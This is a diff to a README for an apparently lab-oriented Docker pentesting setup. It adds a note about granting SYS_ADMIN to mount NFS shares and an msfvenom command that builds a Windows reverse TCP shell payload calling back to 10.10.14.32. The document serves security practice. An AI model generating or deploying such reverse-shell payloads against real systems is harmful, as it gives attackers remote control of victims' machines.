@@ -25,6 +25,8 @@ docker run --rm -it --network=container:vpn --name proxy --entrypoint ssh-proxy 
 docker run --rm -it --network=container:vpn -v $PWD:/app antfie/haksys
 ```
 
+to mount stuff e.g. NFS share add this param `--cap-add SYS_ADMIN`
+
 ## Other Tools
 
 
@@ -33,6 +35,13 @@ docker run --rm -it --network=container:vpn -v $PWD:/app antfie/haksys
 ```
 docker pull metasploitframework/metasploit-framework
 docker run --rm -it --network=container:vpn -v $PWD:/app metasploitframework/metasploit-framework
+```
+
+#### MSF Venom
+
+```
+docker run --rm -it --network=container:vpn -v $PWD:/app --entrypoint bash metasploitframework/metasploit-framework
+/msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.32 LPORT=4189 -f csharp > /app/x
 ```
 
 ### Kali
